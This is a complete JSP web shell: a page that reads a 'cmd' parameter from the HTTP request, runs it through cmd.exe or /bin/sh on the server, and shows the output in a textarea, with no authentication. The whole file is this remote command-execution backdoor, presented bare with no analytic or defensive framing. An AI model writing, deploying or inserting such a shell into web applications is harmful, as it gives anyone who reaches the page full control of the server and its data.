<%@ page contentType="text/html; charset=utf-8" %>
<%@ page import="java.io.*" %>
<%!
public String exeCmd(String strCmd) {
String line="";
StringBuffer sbCmd=new StringBuffer("");
String strOS = System.getProperty("os.name").toLowerCase();

if(strCmd!=null) 
{
	try
	{
		//out.println(strCmd);
		String[] strShell=new String[2];
		if(strOS.startsWith("win"))
		{
			strShell[0]="cmd";
			strShell[1]="/c";
		}
		else
		{
			strShell[0]="/bin/sh";	
			strShell[1]="-c";
		}
		String[] strCommand=new String[3];
		strCommand[0]=strShell[0];
		strCommand[1]=strShell[1];
		strCommand[2]=strCmd;
		System.out.println(strCommand);
		/* Process p=Runtime.getRuntime().exec(strCommand,null,new File(strDir)); */
		Process p=Runtime.getRuntime().exec(strCommand);
		BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
		while((line=br.readLine())!=null)
		{
			sbCmd.append(line+"\r\n");		
		}
		 
	}
	catch(Exception e)
	{
		//System.out.println(e.toString());
		sbCmd.append("<font color=\"red\">bad command \"" + strCmd + "\"</font>");
	}
}
else
{
	strCmd = "set";
}
return sbCmd.toString().trim();
}
%>

<%
String cmd = request.getParameter("cmd");
String result = "";
result = exeCmd(cmd);
%>
<TEXTAREA NAME="cqq" ROWS="32" COLS="100%"><%=result%></TEXTAREA>